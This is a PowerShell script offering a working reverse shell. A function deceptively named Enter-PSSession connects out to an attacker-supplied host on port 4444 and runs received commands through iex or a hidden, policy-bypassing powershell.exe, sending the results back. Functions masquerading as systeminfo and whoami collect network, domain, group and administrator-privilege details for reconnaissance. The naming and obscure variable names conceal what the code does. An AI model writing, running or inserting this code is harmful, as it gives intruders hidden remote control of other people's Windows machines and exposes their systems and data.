# author: Y2FuZXBh

using namespace 'system.io'
using namespace 'system.text'
using namespace 'system.net.sockets'
using namespace 'system.diagnostics'
using namespace 'system.collections'
using namespace 'system.security.principal'
using namespace 'system.net.networkinformation'

function Enter-PSSession {
    param(
        [Parameter(Position=0)]
        [string]$__,
        [Parameter(Position=1)]
        [int]$___=4444,
        [Parameter(Position=2)]
        [int]$____=4
    )
    begin{
        do{
            $_sock = try{[tcpclient]::new(${__}, ${___})}catch{$____ = ${____} - 1}
            if($____ -le 0){exit 1}
        }until($_sock)
    }
    process{
        $_c=0
        $_ = $_sock.GetStream()
        $_writer = [streamwriter]::new($_)
        $_buff = [byte[]]::new(1024)
        $_encode = [asciiencoding]::new()
        $_host = ${env:computername}
        if($_host -ne ${env:userdomain}){$_host="$_host.${env:userdomain}"}
        $_user = $env:username
        if($_user -contains '\'){$_user=$_user.split('\')[1]}
        do{
            $_writer.Flush()
            $_read = $null
            $__res = ""
            while($_.DataAvailable -or $_read -eq $null) {
                $_read = $_.Read($_buff, 0, 1024)
            }
            $_out = $_encode.GetString($_buff, 0, $_read).Replace("`r`n","").Replace("`n","");
            if(-not $_out.equals("exit")){
                $_args = "";
                if($_out.IndexOf(' ') -gt -1){
                    $_args = $_out.substring($_out.IndexOf(' ')+1);
                    $_out = $_out.substring(0,$_out.IndexOf(' '));
                    if($_args.split(' ').length -gt 1){
                        $__info = [processstartinfo]::new()
                        $__info.FileName = $env:Path.split(";").where({$_ -like "*WindowsPowerShell*"})[0]+"powershell.exe"
                        $__info.RedirectStandardError = $true
                        $__info.RedirectStandardOutput = $true
                        $__info.UseShellExecute = $false
                        $__info.Domain = $env:USERDOMAIN
                        $__info.Arguments = "-nop -W hidden -noni -ep bypass -c `"$_out $_args`""
                        $__proc = [process]::new()
                        $__proc.StartInfo = $__info
                        [void]$__proc.Start()
                        $__proc.WaitForExit()
                        $__stout = $__proc.StandardOutput.ReadToEnd()
                        $__sterr = $__proc.StandardError.ReadToEnd()
                        if ($__proc.ExitCode -ne 0) {
                            $__res = $__sterr
                        } else {
                            $__res = $__stout
                        }
                    } else {
                        $__res = (
                            "$_out $_args" | iex -ErrorVariable "__err") 2>$null
                    }
                } else {
                    if ($_out){
                        $__res = ("$_out" | iex -ErrorVariable "__err") 2>$null
                        $_c = 0
                    }
                    else{
                        $_c++
                    }
                    if($_c -eq 2){exit 1}
                }
                if($__err){$__res = "ERROR: " + $__err}
                $_writer.WriteLine("")
                foreach($_l in $__res){$_writer.WriteLine("${_l}")}
                if($__res){$_writer.WriteLine("")}
                $_writer.WriteLine("${_user}@${_host}:$(pwd)$".tolower())
            }
        }
        While (-not $_out.equals("exit"))
    }
    end{
        $_writer.close();
        $_sock.close();
        $_.Dispose();
    }
}

function systeminfo {
    begin{}
    process{
        $_ = ([NetworkInterface]::GetAllNetworkInterfaces().where({
            $_.OperationalStatus -ieq "up" -and ("ethernet","wireless80211") -icontains $_.NetworkInterfaceType
        }) | Sort-Object -Property Speed -Descending)[0].foreach({
            [pscustomobject]@{
                node = [IPGlobalProperties]::GetIPGlobalProperties().foreach({
                    $__ = 'local'
                    if($_.domainname){$__ = ${_}.domainname}
                    [pscustomobject]@{
                        hostname = ${_}.hostname.tolower()
                        domain = ${__}
                        fqdn = "$(${_}.hostname).${__}".tolower()
                    }
                })
                nic = [pscustomobject]@{
                    name = $_.name
                    info = $_.description
                    type = $_.networkinterfacetype
                    ip = $_.GetIPProperties().UnicastAddresses.foreach({
                            if($_.Address.AddressFamily -ieq "InterNetwork"){$_.Address.IPAddressToString}
                        })[0]
                    }
                    network = $_.GetIPProperties().foreach({
                        [pscustomobject]@{
                            gateway = $_.GatewayAddresses.Address.IPAddressToString
                            dhcp = $_.DhcpServerAddresses.IPAddressToString
                            dns = $_.DnsAddresses.IPAddressToString
                        }
                    })
                }
        })
   }
   end{
       return $_
   }
}

function whoami {
    param()
    begin{}
    process{}
    end{
        return [windowsidentity]::GetCurrent().foreach({
            $__ = [list[string]]::new($_.Name.split("\"));$__.Reverse();
            [pscustomobject]@{
                sid = $_.User
                type = $_.AuthenticationType
                login = $__ -join "@"
                privileged = $_.groups.value -contains "S-1-5-32-544"
                domain = $__[1]
                groups = $_.groups.foreach({$_=[securityidentifier]::new($_);if(-not $_.IsAccountSid()){$_.Translate([ntaccount]).ToString()}}) | sort-object
            }
        })
    }
}